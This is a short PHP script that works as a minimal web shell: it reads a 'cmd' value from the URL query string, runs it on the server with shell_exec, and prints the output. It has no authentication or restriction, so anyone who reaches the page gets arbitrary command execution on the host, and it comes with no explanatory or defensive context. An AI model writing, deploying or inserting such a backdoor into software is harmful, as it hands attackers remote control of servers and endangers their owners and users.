<?php
if (!isset($_GET['cmd'])) {
    die("Provide cmd in query parameter");
}
$cmd = $_GET['cmd'];
echo "<pre>";
echo htmlspecialchars(shell_exec($cmd . ' 2>&1'));
echo "</pre>";
